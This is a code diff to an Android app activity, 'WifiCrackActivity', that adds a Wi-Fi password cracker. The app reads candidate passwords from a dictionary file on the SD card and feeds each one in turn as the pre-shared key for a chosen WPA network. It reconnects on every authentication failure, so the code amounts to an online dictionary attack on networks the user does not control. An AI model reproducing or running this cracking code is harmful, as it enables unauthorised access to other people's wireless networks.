@@ -2,21 +2,18 @@ package com.wifi.android.runwifipassword;
 
 import android.app.Activity;
 import android.app.AlertDialog;
-import android.app.Dialog;
-import android.app.ProgressDialog;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.graphics.Rect;
-import android.net.NetworkInfo;
 import android.net.wifi.ScanResult;
+import android.net.wifi.SupplicantState;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
-import android.text.style.ForegroundColorSpan;
+import android.preference.Preference;
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -26,12 +23,12 @@ import android.widget.BaseAdapter;
 import android.widget.LinearLayout;
 import android.widget.RelativeLayout;
 import android.widget.TextView;
-
 import com.wifi.android.runwifipassword.util.AccessPoint;
+import com.wifi.android.runwifipassword.util.CopyData_File;
+import com.wifi.android.runwifipassword.util.PasswordGetter;
 import com.wifi.android.runwifipassword.view.PinnedSectionListView;
 
-import org.xml.sax.helpers.LocatorImpl;
-
+import java.io.FileNotFoundException;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Comparator;
@@ -44,7 +41,6 @@ public class WifiCrackActivity extends Activity {
     private WifiManager wifimanager;
     private WifiInfo connectionInfo;
     private List<ScanResult> scanResults;
-    private String TAG = "chuangguo.qi";
     private List<WifiConfiguration> configuredNetworks;
     private List<WifiPo> myWifi;
     private List<WifiPo> crackWifi;
@@ -61,15 +57,47 @@ public class WifiCrackActivity extends Activity {
     private TextView tvName;
     private TextView classify_tv;
     private TextView forget;
-    private int netid;
+    private int netids;
     private listViewAdaper adapter;
+    private WifiInfo wifiInfo;
+    //String TAG = "chuangguo.qi";
     private WifiReceiver wifiReceiver;
+    private AccessPoint ap;
+    private AccessPoint tmpap;
+    private Preference preference;
+    private String password;
+    private List<WifiConfiguration> configs;
+    private IntentFilter intentFilter;
+    //private PasswordGetter passwordGetter;
+    private boolean cracking;
+    private WifiConfiguration config;
+    private int netid;
+    private static final String TAG = "chuangguo.qi";
+    List<ScanResult> results;
+    ScanResult result;
+    private int nowid = 0;
+    private PasswordGetter passwordGetter;
+    ScanResult scanResult = null;
+    private String crackWifiSSID;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        CopyData_File co = new CopyData_File(this);
+        co.DoCopy();
         setContentView(R.layout.activity_wifi_crack);
-
+        cracking = false;
+        netid = -1;
+        try {
+            passwordGetter = new PasswordGetter("/sdcard/password.txt");
+        } catch (FileNotFoundException e) {
+            showMessageDialog("程序初始化失败", "sd卡错误无法初始化密码字典，请检查sd卡", "确定", false,
+                    new DialogInterface.OnClickListener() {
+                        public void onClick(DialogInterface dialog, int which) {
+                            //WIFICracker.this.finish();
+                        }
+                    });
+        }
         //初始化wifi管理器
         wifimanager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
         wifiReceiver = new WifiReceiver();
@@ -230,7 +258,7 @@ public class WifiCrackActivity extends Activity {
         forget.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-                wifimanager.removeNetwork(netid);
+                wifimanager.removeNetwork(netids);
                 wifimanager.saveConfiguration();
                 layoutvisibility(View.GONE);
                 getwifiData();
@@ -247,6 +275,9 @@ public class WifiCrackActivity extends Activity {
                 int state = listData.get(i).getState();
                 mConfig = new WifiConfiguration();
                 if (state == 0) {//破解
+
+                    crackWifiSSID=listData.get(i).getName();
+                    update();
 
                 } else if (state == 1) {//我的
                     if (wifimanager.getConnectionInfo().getSSID().equals("\""+listData.get(i).getName()+"\"")) {
@@ -377,7 +408,7 @@ public class WifiCrackActivity extends Activity {
         relativeLayout.setVisibility(visibility);
     }
 
-    class WifiReceiver extends BroadcastReceiver{
+    /*class WifiReceiver extends BroadcastReceiver{
 
 
         @Override
@@ -388,6 +419,7 @@ public class WifiCrackActivity extends Activity {
                 NetworkInfo info = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
                 if(info.getState().equals(NetworkInfo.State.DISCONNECTED)){
                     Log.i(TAG, "onReceive:\"wifi网络连接断开 ");
+                    layoutvisibility(View.GONE);
                 }
                 else if(info.getState().equals(NetworkInfo.State.CONNECTED)){
 
@@ -414,11 +446,196 @@ public class WifiCrackActivity extends Activity {
                 setTitle("WIFI验证失败！");
             }
         }
+    }*/
+
+    class WifiReceiver extends BroadcastReceiver {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            String action = intent.getAction();
+            if (WifiManager.SCAN_RESULTS_AVAILABLE_ACTION.equals(action)) {
+                if (results == null) // 只初始化一次
+                    results = wifimanager.getScanResults();
+                try {
+
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                if (cracking){
+                    Log.i(TAG, "onReceive: "+"不更新界面");
+                    update();
+                }
+
+            } else if (WifiManager.SUPPLICANT_STATE_CHANGED_ACTION
+                    .equals(action)) {
+                WifiInfo info = wifimanager.getConnectionInfo();
+                SupplicantState state = info.getSupplicantState();
+                String str = null;
+                if (state == SupplicantState.ASSOCIATED) {
+                    nowid++;
+                    str = "关联AP完成";
+                } else if (state.toString().equals("AUTHENTICATING")) {
+                    if (password!=null && password.length()>0) {
+                        str = "正在验证密码" + AccessPoint.removeDoubleQuotes(password);
+                    }
+                } else if (state == SupplicantState.ASSOCIATING) {
+                    str = "正在关联AP...";
+                } else if (state == SupplicantState.COMPLETED) {
+                    if (cracking) {
+                        cracking = false;
+                        return;
+                    } else
+                        str = "已连接";
+                    passwordGetter.reSet();
+                } else if (state == SupplicantState.DISCONNECTED) {
+                    str = "已断开";
+
+                } else if (state == SupplicantState.DORMANT) {
+                    str = "暂停活动";
+                } else if (state == SupplicantState.FOUR_WAY_HANDSHAKE) {
+                    if (password!=null && password.length()>0) {
+                        str = "破解密码中.." + AccessPoint.removeDoubleQuotes(password)
+                                + "  破解进行到第" + nowid + "个";
+                    }
+                } else if (state == SupplicantState.GROUP_HANDSHAKE) {
+                    str = "GROUP_HANDSHAKE";
+                } else if (state == SupplicantState.INACTIVE) {
+                    str = "休眠中...";
+                    if (cracking)
+                        connectNetwork(); // 连接网络
+                } else if (state == SupplicantState.INVALID) {
+                    str = "无效";
+                } else if (state == SupplicantState.SCANNING) {
+                    str = "扫描中...";
+                } else if (state == SupplicantState.UNINITIALIZED) {
+                    str = "未初始化";
+                }
+                Log.i(TAG, "onReceive: "+str);
+                setTitle(str);
+                final int errorCode = intent.getIntExtra(
+                        WifiManager.EXTRA_SUPPLICANT_ERROR, -1);
+                if (errorCode == WifiManager.ERROR_AUTHENTICATING) {
+                    Log.i(TAG, "WIFI验证失败！");
+                    
+                    if (cracking == true)
+                        connectNetwork();
+                }
+            }
+
+
+        }
     }
+
+    private void connectNetwork() {
+
+        if (cracking) {
+            ap.mConfig.priority = 1;
+            ap.mConfig.status = WifiConfiguration.Status.ENABLED;
+            password = passwordGetter.getPassword(); // 从外部字典加载密码
+            Log.i(TAG, "password: --------"+password);
+            if (password == null || password.length() == 0) {
+                setTitle("抱歉强密码难以破解，常规密码本已猜解完毕，没有跑出密码！请等待升级版本在来试下");
+                cracking = false;
+                return;
+            }
+            password = "\"" + password + "\"";
+            ap.mConfig.preSharedKey = password; // 设置密码
+            Log.d(TAG, ap.toString());
+            if (netid == -1) {
+                netid = wifimanager.addNetwork(ap.mConfig);
+                ap.mConfig.networkId = netid;
+                Log.i(TAG, "添加AP失败");
+            } else
+                wifimanager.updateNetwork(ap.mConfig);
+            setTitle("尝试连接:" + ap.mConfig.SSID + "密码:"
+                    + ap.mConfig.preSharedKey);
+            // enableNetwork、saveConfiguration、reconnect为connectNetwork的实现
+            if (wifimanager.enableNetwork(netid, true)){
+                Log.i(TAG, "connectNetwork: 启用网络失败");
+            }
+            wifimanager.saveConfiguration();
+            wifimanager.reconnect(); // 连接AP
+            Log.i(TAG, "connectNetwork: "+"连接中。。。。。");
+        }
+    }
+
+    public void update(){
+
+        if (results==null){
+
+            return;
+        }
+        if (scanResult==null) {
+            Log.i(TAG, "update:--- "+crackWifiSSID);
+            for (int i = 0; i < results.size(); i++) {
+                scanResult = results.get(i);
+                if (scanResult.SSID.equals(crackWifiSSID)) {
+                    break;
+                }
+            }
+        }else {
+
+            tmpap = new AccessPoint(this, scanResult);
+            Log.i(TAG, "update: "+scanResult.SSID);
+            checkAP();
+            return;
+        }
+        if (scanResult!=null) {
+            tmpap = new AccessPoint(this, scanResult);
+            Log.i(TAG, "update: "+scanResult.SSID);
+            checkAP();
+        }
+    }
+
+    private void checkAP() {
+
+        if (tmpap.security == AccessPoint.SECURITY_NONE) {
+            setTitle("该AP没有加密，不需要破解！");
+            return;
+        } else if ((tmpap.security == AccessPoint.SECURITY_EAP)
+                || (tmpap.security == AccessPoint.SECURITY_WEP)) {
+            setTitle("暂不支持EAP与WEP加密方式的破解！");
+            return;
+        }
+
+        showMessageDialog("WIFI热点信息", tmpap.toString(), "破解", true,
+                new DialogInterface.OnClickListener() {
+                    public void onClick(DialogInterface dialog, int which) {
+                        scanResult=null;
+                        cracking = true;
+                        setTitle("正在破解...");
+                        try {
+                            ap = tmpap;
+                            connectNetwork(); // 连接网络
+                            //enablePreferenceScreens(false);
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                    }
+                });
+
+    }
+
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
         unregisterReceiver(wifiReceiver);
     }
+    private void showMessageDialog(String title, String message,
+                                   String positiveButtonText, boolean bShowCancel,
+                                   DialogInterface.OnClickListener positiveButtonlistener) {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle(title);
+        builder.setMessage(message);
+        builder.setPositiveButton(positiveButtonText, positiveButtonlistener);
+        if (bShowCancel) {
+            builder.setNegativeButton("取消", new DialogInterface.OnClickListener() {
+                public void onClick(DialogInterface dialog, int which) {
+                }
+            });
+        }
+        builder.create().show();
+    }
+
+
 }
